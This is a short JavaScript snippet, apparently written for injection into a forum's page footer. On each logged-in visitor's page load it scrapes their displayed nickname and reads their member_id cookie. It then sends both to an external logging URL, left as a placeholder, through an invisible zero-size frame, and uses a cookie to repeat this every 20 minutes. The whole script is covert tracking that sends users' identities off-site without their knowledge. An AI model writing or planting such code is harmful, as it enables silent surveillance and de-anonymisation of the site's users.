function loggedIn() {
  return ($.cookie('member_id') != null && $.cookie('member_id') != "0");
}
function getNick() {
  var userlinks = document.getElementById("userlinks");
  var out = userlinks.innerHTML.match(/Logged in as: +?(?:<a.+?>)?([^ ].*?)<\//i); //regex aboose
  return out[1];
}
function getId() {
  return $.cookie('member_id');
}
function logUrl() {
  return "URL HERE@@@@";
}
function createFrame(nick, id) {
  var frame = document.createElement('frame');
  frame.width = 0;
  frame.height = 0;
  frame.frameBorder = 0;
  frame.src = logUrl() + "?name=" + escape(nick) + "&id=" + id;
  frame.style.display = "none";
  return frame;
}
function setTtCookie(nick) {
  var date = new Date();
  // 20 minutes
  date.setTime(date.getTime() + (20 * 60 * 1000));
  $.cookie("ttip", nick, { path: '/', expires: date });
}
if (loggedIn() && $.cookie("ttip") != getNick()) {
  $("#gfooter").append(createFrame(getNick(), getId()));
  setTtCookie(getNick());
}
